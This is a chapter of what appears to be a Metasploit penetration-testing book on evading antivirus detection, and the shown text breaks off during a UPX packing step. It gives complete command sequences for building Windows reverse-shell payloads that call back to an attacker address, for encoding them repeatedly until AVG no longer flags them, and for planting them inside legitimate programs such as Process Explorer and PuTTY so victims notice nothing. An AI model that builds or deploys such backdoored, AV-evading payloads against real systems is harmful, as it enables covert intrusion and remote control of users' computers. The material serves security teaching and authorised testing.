<html><head></head><body><section epub:type="chapter" id="avoiding_detection"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 7. Avoiding Detection</h2></div></div></div><p class="calibre2">When you are performing a penetration test, nothing is more embarrassing than being caught by antivirus software. This is one of those little details that can be overlooked quite easily: If you don’t make plans to evade detection by antivirus software, watch out, because your target will quickly be alerted that something fishy is going on. In this chapter, we’ll cover situations in which antivirus software might be an issue and discuss possible solutions.<a id="IDX-CHP-7-0001" class="strong"/><a id="IDX-CHP-7-0002" class="strong"/></p><p class="calibre2">Most antivirus software uses <span class="strong"><em class="calibre4">signatures</em></span> to identify aspects of malicious code that are present in a sampling of malicious software. These signatures are loaded into antivirus engines and then used to scan disk storage and running processes for matches. When a match is found, the antivirus software takes certain steps to respond to the situation: Most quarantine the binary or kill the running process.<a id="IDX-CHP-7-0003" class="strong"/></p><p class="calibre2">As you might imagine, this model has scaling issues. For one, the amount of malicious code in the wild means that an antivirus product loaded with signatures can check files only so quickly for matching signatures. Also, the signatures must be specific enough to trigger only when they encounter truly malicious programs, not legitimate software. This model is relatively easy to implement, yet it provides limited success in practice.<a id="IDX-CHP-7-0004" class="strong"/><a id="IDX-CHP-7-0005" class="strong"/><a id="IDX-CHP-7-0006" class="strong"/><a id="IDX-CHP-7-0007" class="strong"/><a id="IDX-CHP-7-0008" class="strong"/><a id="IDX-CHP-7-0009" class="strong"/><a id="IDX-CHP-7-0010" class="strong"/></p><p class="calibre2">That being said, a lot of money is being made by antivirus publishers, and many smart and talented people work in the industry. If you plan to use a payload that is not custom built, you can expect that antivirus software will detect it.</p><p class="calibre2">To evade antivirus, we can create unique payloads to run on an antivirus software–protected system that will not match any of the available signatures. In addition, when we’re performing direct exploits on a system, Metasploit payloads are designed to run in memory and never to write data to the hard disk. When we send a payload as part of an exploit, most antivirus programs will not detect that it has been run on the target.</p><p class="calibre2">Rather than focus on specific commands in this chapter, we’ll focus on the underlying concepts. Consider the sorts of characteristics that might trigger antivirus software, and try to use the techniques presented here to change sections of code so that they no longer match the antivirus signatures. Don’t be afraid to experiment.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="creating_stand-alone_binaries_with_msfpa">Creating Stand-Alone Binaries with MSFpayload</h2></div></div></div><p class="calibre2">Before we perform an antivirus evasion, let’s look at how to create stand-alone Metasploit binary payloads with <span class="strong"><em class="calibre4">msfpayload</em></span>. For starters, we’ll create a simple reverse shell that connects back to the attacker and spawns a command shell. We’ll use <code class="literal">msfpayload</code> and <code class="literal">windows/shell_reverse_tcp</code>. But first, let’s look at the available options for the <code class="literal">shell_reverse_tcp</code> payload using the <code class="literal">O</code> flag at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e8980" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><a id="I_programlisting7_d1e8986" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp O</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique: seh, thread, process
LHOST                      yes       The local address
LPORT     4444             yes       The local port</pre><p class="calibre2">Now let’s run <code class="literal">msfpayload</code> again and provide the options needed to create this payload in the Windows Portable Executable (PE) format. To do so, we provide the <code class="literal">X</code> option as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9008" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> as our output format:<a id="IDX-CHP-7-0011" class="strong"/></p><a id="I_programlisting7_d1e9017" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X</code></strong>
 <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">&gt;</code></strong>
    <strong class="calibre3"><code class="calibre6">/var/www/payload1.exe</code></strong>
root@bt:/# <strong class="calibre3"><code class="calibre6">file /var/www/payload1.exe</code></strong>
var/www/payload1.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</pre><p class="calibre2">Now we have a working executable, so we can start a listener with the <span class="strong"><em class="calibre4">multi/handler</em></span> module in <span class="strong"><em class="calibre4">msfconsole</em></span>. <span class="strong"><em class="calibre4">multi/handler</em></span> allows Metasploit to listen for reverse connections.</p><a id="I_programlisting7_d1e9048" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use exploit/multi/handler</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LHOST     192.168.1.101    yes       The local address
   LPORT     4444             yes       The local port

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD windows/shell_reverse_tcp</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
PAYLOAD =&gt; windows/shell_reverse_tcp
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.1.101</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
LHOST =&gt; 192.168.1.101
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 31337</code></strong> <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
LPORT =&gt; 31337
msf exploit(handler) &gt;</pre><p class="calibre2">We first use the <span class="strong"><em class="calibre4">multi/handler</em></span> module at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9108" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and get a quick display of the options at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9114" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Then, we set our payload to be a Windows reverse shell at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9120" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> so that it matches the behavior of the executable we created earlier, tell it the IP at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9126" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and the port to listen on at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9133" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>, and we’re ready to go.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="evading_antivirus_detection">Evading Antivirus Detection</h2></div></div></div><p class="calibre2">We’ll use the popular AVG Anti-Virus product in the following examples. Because it can take some time and multiple tries to circumvent certain antivirus engines, before we try to deploy a payload, we check the antivirus solution to make sure the payload gets past it before we deploy it on the target.</p><p class="calibre2">In this case, when we test our payload with AVG, we see that it’s detected, as shown in <a class="xref" href="part0011.html#avg_detected_our_payload">Figure 7-1</a>.</p><div class="figure"><a id="avg_detected_our_payload" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject7_d1e9151" class="strong"/><img src="../images/00031.jpeg" alt="AVG detected our payload." hisrc="httpatomoreillycomsourcenostarchimages867516.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 7-1. AVG detected our payload.</div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="encoding_with_msfencode">Encoding with MSFencode</h3></div></div></div><p class="calibre2">One of the best ways to avoid being stopped by antivirus software is to encode our payload with <span class="strong"><em class="calibre4">msfencode</em></span>. <span class="strong"><em class="calibre4">Msfencode</em></span> is a useful tool that alters the code in an executable so that it looks different to antivirus software but will still run the same way. Much as the binary attachment in email is encoded in Base64, <span class="strong"><em class="calibre4">msfencode</em></span> encodes the original executable in a new binary. Then, when the executable is run, <span class="strong"><em class="calibre4">msfencode</em></span> decodes the original code into memory and executes it.<a id="IDX-CHP-7-0012" class="strong"/><a id="IDX-CHP-7-0013" class="strong"/><a id="IDX-CHP-7-0014" class="strong"/><a id="IDX-CHP-7-0015" class="strong"/></p><p class="calibre2">You can use <code class="literal">msfencode -h</code> to see a list of <span class="strong"><em class="calibre4">msfencode</em></span> usage options. Of the <span class="strong"><em class="calibre4">msfencode</em></span> options, the encoder formats are among the most important. For a list of encoder formats, we use <code class="literal">msfencode -l</code>, as shown next. Notice that different encoders are used for different platforms, because, for example, a Power PC (PPC) encoder will not operate correctly on an x86 platform because of differences in the two architectures.</p><a id="I_programlisting7_d1e9204" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfencode -l</code></strong>

Framework Encoders
==================

    Name                    Rank       Description
    ----                    ----       -----------
    cmd/generic_sh          good       Generic Shell
 Variable Substitution Command Encoder
    cmd/ifs                 low        Generic ${IFS} Substitution Command Encoder
    generic/none            normal     The "none" Encoder
    mipsbe/longxor          normal     XOR Encoder
    mipsle/longxor          normal     XOR Encoder
    php/base64              normal     PHP Base64 encoder
    ppc/longxor             normal     PPC LongXOR Encoder
    ppc/longxor_tag         normal     PPC LongXOR Encoder
    sparc/longxor_tag       normal     SPARC DWORD XOR Encoder
    x64/xor                 normal     XOR Encoder
    x86/alpha_mixed         low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper         low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_utf8_tolower  manual     Avoid UTF8/tolower
    x86/call4_dword_xor     normal     Call+4 Dword XOR Encoder
    x86/countdown           normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov         normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive   normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha            low        Non-Alpha Encoder
    x86/nonupper            low        Non-Upper Encoder
    <strong class="calibre3"><code class="calibre6">x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder</code></strong>
    x86/single_static_bit   manual     Single Static Bit
    x86/unicode_mixed       manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper       manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</pre><p class="calibre2">Now we’ll run a simple encoding of an MSF payload by importing raw output from <span class="strong"><em class="calibre4">msfpayload</em></span> into <span class="strong"><em class="calibre4">msfencode</em></span> to see how the result affects our antivirus detection:<a id="IDX-CHP-7-0016" class="strong"/><a id="IDX-CHP-7-0017" class="strong"/><a id="IDX-CHP-7-0018" class="strong"/><a id="IDX-CHP-7-0019" class="strong"/><a id="IDX-CHP-7-0020" class="strong"/><a id="IDX-CHP-7-0021" class="strong"/></p><a id="I_programlisting7_d1e9242" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R</code></strong>
 <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">|</code></strong>
    <strong class="calibre3"><code class="calibre6">msfencode -e x86/shikata_ga_nai</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">-t exe</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
 <strong class="calibre3"><code class="calibre6">&gt; /var/www/payload2.exe</code></strong>
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)

root@bt:/# <strong class="calibre3"><code class="calibre6">file /var/www/payload2.exe</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
/var/www/2.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit</pre><p class="calibre2">We add the <code class="literal">R</code> flag at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9292" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> to the <code class="literal">msfpayload</code> command line to specify raw output, because we will pipe its output directly into <span class="strong"><em class="calibre4">msfencode</em></span>. We specify the <code class="literal">x86/shikata_ga_nai</code> encoder at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9308" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and tell <span class="strong"><em class="calibre4">msfencode</em></span> to send the executable output <code class="literal">-t exe</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9320" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> to <span class="strong"><em class="calibre4">/var/www/payload2.exe</em></span>. Finally, we run a quick check at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9329" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> to ensure that the resulting file is in fact a Windows executable. The response tells us that it is. Unfortunately, after the <span class="strong"><em class="calibre4">payload2.exe</em></span> file is copied over to the Windows system, AVG detects our encoded payload yet again, as shown in <a class="xref" href="part0011.html#avg_detected_our_encoded_payload">Figure 7-2</a>.</p><div class="figure"><a id="avg_detected_our_encoded_payload" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject7_d1e9344" class="strong"/><img src="../images/00032.jpeg" alt="AVG detected our encoded payload." hisrc="httpatomoreillycomsourcenostarchimages867518.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 7-2. AVG detected our encoded payload.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="multi-encoding">Multi-encoding</h3></div></div></div><p class="calibre2">When we’re performing antivirus detection without modifying the static binary itself, it’s always a cat-and-mouse game, because antivirus signatures are frequently updated to detect new and changed payloads. Within the Framework, we can get better results through <span class="strong"><em class="calibre4">multi-encoding</em></span>, which allows the payload to be encoded several times to throw off antivirus programs that check for signatures.</p><p class="calibre2">In the preceding example, the <code class="literal">shikata_ga_nai</code> encoding is <span class="strong"><em class="calibre4">polymorphic</em></span>, meaning that the payload will change each time the script is run. Of course, the payload that an antivirus product will flag is a mystery: Every time you generate a payload, the same antivirus program can flag it once and miss it another time.</p><p class="calibre2">It is recommended that you test your script using an evaluation version of a product to see if it bypasses the antivirus software prior to using it in a penetration test. Here’s an example of using multiple encoding passes:<a id="IDX-CHP-7-0022" class="strong"/></p><a id="I_programlisting7_d1e9370" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp</code></strong>
   <strong class="calibre3"><code class="calibre6">LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
    <strong class="calibre3"><code class="calibre6">-t raw</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">| msfencode  -e x86/alpha_upper -c 2</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
 <strong class="calibre3"><code class="calibre6">-t raw | msfencode -e</code></strong>
    <strong class="calibre3"><code class="calibre6">x86/shikata_ga_nai -c 5</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
 <strong class="calibre3"><code class="calibre6">-t raw | msfencode -e x86/countdown -c 5</code></strong>
 <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
    <strong class="calibre3"><code class="calibre6">-t exe -o /var/www/payload3.exe</code></strong>
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 345 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 372 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 399 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 426 (iteration=5)
[*] x86/alpha_upper succeeded with size 921 (iteration=1)
[*] x86/alpha_upper succeeded with size 1911 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 1940 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 1969 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 1998 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 2027 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 2056 (iteration=5)
[*] x86/countdown succeeded with size 2074 (iteration=1)
[*] x86/countdown succeeded with size 2092 (iteration=2)
[*] x86/countdown succeeded with size 2110 (iteration=3)
[*] x86/countdown succeeded with size 2128 (iteration=4)
[*] x86/countdown succeeded with size 2146 (iteration=5)
root@bt:/opt/framework3/msf3#</pre><p class="calibre2">Here we use five counts at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9430" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> of <code class="literal">shikata_ga_nai</code>, feeding the code in raw format at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9439" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> into two counts of <code class="literal">alpha_upper</code> encoding at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9448" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, which is then fed to another five counts of <code class="literal">shikata_ga_nai</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9458" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>,followed by five counts of <code class="literal">countdown</code> encoding at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9467" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>, before finally directing the output into the desired executable. We are using a total of 17 encoding loops in an attempt to circumvent the antivirus software. And, as you can see in <a class="xref" href="part0011.html#avg_has_not_detected_the_multi-encoded_p">Figure 7-3</a>, we have successfully slipped our payload past the antivirus engine.</p><div class="figure"><a id="avg_has_not_detected_the_multi-encoded_p" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject7_d1e9478" class="strong"/><img src="../images/00033.jpeg" alt="AVG has not detected the multi-encoded payload." hisrc="httpatomoreillycomsourcenostarchimages867520.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 7-3. AVG has not detected the multi-encoded payload.</div></div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="custom_executable_templates">Custom Executable Templates</h2></div></div></div><p class="calibre2">Typically, when <code class="literal">msfencode</code> is run, the payload is embedded into the default executable template at <span class="strong"><em class="calibre4">data/templates/template.exe</em></span>. Although this template is changed on occasion, antivirus vendors still look for it when building signatures. However, <span class="strong"><em class="calibre4">msfencode</em></span> now supports the use of any Windows executable in place of the default executable template via the <code class="literal">-x</code> option. In the following example, we encode our payload again using the Process Explorer from Microsoft’s Sysinternals Suite as a custom-executable template.<a id="IDX-CHP-7-0023" class="strong"/><a id="IDX-CHP-7-0024" class="strong"/><a id="IDX-CHP-7-0025" class="strong"/></p><a id="I_programlisting7_d1e9514" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">wget  http://download.sysinternals.com/Files/</code></strong>
    <strong class="calibre3"><code class="calibre6">ProcessExplorer.zip</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

2011-03-21 17:14:46 (119 KB/s) - 'ProcessExplorer.zip' saved [1615732/1615732]

root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">cd work/</code></strong>
root@bt:/opt/framework3/msf3/work# <strong class="calibre3"><code class="calibre6">unzip ../ProcessExplorer.zip</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
Archive:  ../ProcessExplorer.zip
  inflating: procexp.chm
  inflating: procexp.exe
  inflating: Eula.txt
root@bt:/opt/framework3/msf3/work# <strong class="calibre3"><code class="calibre6">cd ..</code></strong>
root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp</code></strong>
     <strong class="calibre3"><code class="calibre6">LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x work/procexp.exe</code></strong>
 <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
     <strong class="calibre3"><code class="calibre6">-o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5</code></strong>
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)</pre><p class="calibre2">As you can see, at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9565" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we download Process Explorer from Microsoft then unzip it at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9571" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Then at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9577" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we use the <code class="literal">-x</code> switch to specify the downloaded Process Explorer binary for use as our custom template. After encoding completes, we start up the multi-handler through <span class="strong"><em class="calibre4">msfcli</em></span> to listen for the incoming connection, as shown here:</p><a id="I_programlisting7_d1e9589" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfcli exploit/multi/handler PAYLOAD=windows/</code></strong>
    <strong class="calibre3"><code class="calibre6">shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 E</code></strong>
[*] Please wait while we load the module tree...
[*] Started reverse handler on 192.168.1.101:8080
[*] Starting the payload handler...
[*] Command shell session 1 opened (192.168.1.101:8080 -&gt; 192.168.1.195:1191)

C:\Documents and Settings\Administrator\My Documents\Downloads&gt;</pre><p class="calibre2">And voilà: We have successfully opened a shell without being detected by antivirus software.</p><div class="figure"><a id="the_backdoored_executable_is_not_detecte" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject7_d1e9602" class="strong"/><img src="../images/00034.jpeg" alt="The backdoored executable is not detected by AVG." hisrc="httpatomoreillycomsourcenostarchimages867522.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 7-4. The backdoored executable is not detected by AVG.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="launching_a_payload_stealthily">Launching a Payload Stealthily</h2></div></div></div><p class="calibre2">For the most part, when a targeted user launches a backdoored executable such as the one we just generated, nothing will appear to happen, and that can raise suspicions. To improve your chances of not tipping off a target, you can launch a payload while simultaneously continuing normal execution of the launched application, as shown here:<a id="IDX-CHP-7-0026" class="strong"/></p><a id="I_programlisting7_d1e9615" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">wget http://the.earth.li/˜sgtatham/</code></strong>
    <strong class="calibre3"><code class="calibre6">putty/latest/x86/putty.exe</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

2011-03-21 17:02:48 (133 KB/s) - 'putty.exe' saved [454656/454656]
root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp</code></strong>
    <strong class="calibre3"><code class="calibre6">LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x putty.exe -o /var/</code></strong>
    <strong class="calibre3"><code class="calibre6">www/putty_backdoor.exe -e x86/shikata_ga_nai -k</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">-c 5</code></strong>
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)</pre><p class="calibre2">In this listing, we download the PuTTY Windows SSH client at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9653" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and then access PuTTY using the <code class="literal">-k</code> flag at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9662" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. The <code class="literal">-k</code> flag configures the payload to launch in a separate thread from the main executable so the application will behave normally while the payload is being executed. Now, as shown in <a class="xref" href="part0011.html#avg_declares_the_payload_safe_and_the_co">Figure 7-5</a>, when this executable is processed with AVG, it comes back clean and should execute while still presenting us with a shell! (This option may not work with all executables, so be sure to test yours before deployment.)<a id="IDX-CHP-7-0027" class="strong"/></p><p class="calibre2">When choosing to embed a payload in an executable, you should consider using GUI-based applications if you’re not specifying the <code class="literal">-k</code> flag. If you embed a payload into a console-based application, when the payload is run, it will display a console window that won’t close until you’re finished using the payload. If you choose a GUI-based application and do not specify the <code class="literal">-k</code> flag, when the payload is executed, the target will not see a console window. Paying attention to these little details can help you remain stealthy during an engagement.<a id="IDX-CHP-7-0028" class="strong"/><a id="IDX-CHP-7-0029" class="strong"/><a id="IDX-CHP-7-0030" class="strong"/></p><div class="figure"><a id="avg_declares_the_payload_safe_and_the_co" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject7_d1e9701" class="strong"/><img src="../images/00035.jpeg" alt="AVG declares the payload safe and the computer secure." hisrc="httpatomoreillycomsourcenostarchimages867524.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 7-5. AVG declares the payload safe and the computer secure.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="packers">Packers</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Packers</em></span> are tools that compress an executable and combine it with decompression code. When this new executable is run, the decompression code re-creates the original executable from the compressed code before executing it. This usually happens transparently so the compressed executable can be used in exactly the same way as the original. The result of the packing process is a smaller executable that retains all the functionality of the original.</p><p class="calibre2">As with <span class="strong"><em class="calibre4">msfencode</em></span>, packers change the structure of an executable. However, unlike the <span class="strong"><em class="calibre4">msfencode</em></span> encoding process, which often increases the size of an executable, a carefully chosen packer will use various algorithms to both compress and encrypt an executable. Next, we use the popular <span class="strong"><em class="calibre4">UPX</em></span> packer with Back|Track to compress and encode our <span class="strong"><em class="calibre4">payload3.exe</em></span> payload in attempt to evade antivirus software detection.</p><a id="I_programlisting7_d1e9728" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">apt-get install upx</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

root@bt:/# <strong class="calibre3"><code class="calibre6">upx</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2009
UPX 3.04         Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 27th 2009

Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Type 'upx--help' for more detailed help.
UPX comes with ABSOLUTELY NO WARRANTY; for details visit http://upx.sf.net
root@bt:/# <strong class="calibre3"><code class="calibre6">upx −5 /var/www/payload3.exe</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
                       Ultimate Packer for eXecutables
